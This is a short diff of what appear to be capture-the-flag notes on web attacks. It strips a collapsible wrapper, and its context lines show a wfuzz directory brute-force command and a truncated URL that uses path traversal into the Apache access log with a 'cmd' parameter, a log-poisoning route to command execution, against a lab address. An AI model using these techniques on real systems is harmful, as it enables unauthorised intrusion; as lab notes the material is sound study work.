@@ -1,5 +1,3 @@
-<details><summary>Web</summary>
-
 #### Discover hidden directories:
 ```linux
 wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://$IP/island/2100/FUZZ.ticket
@@ -41,5 +39,3 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 ```
 
 #### cadaver for WebDAV
-
-</details>
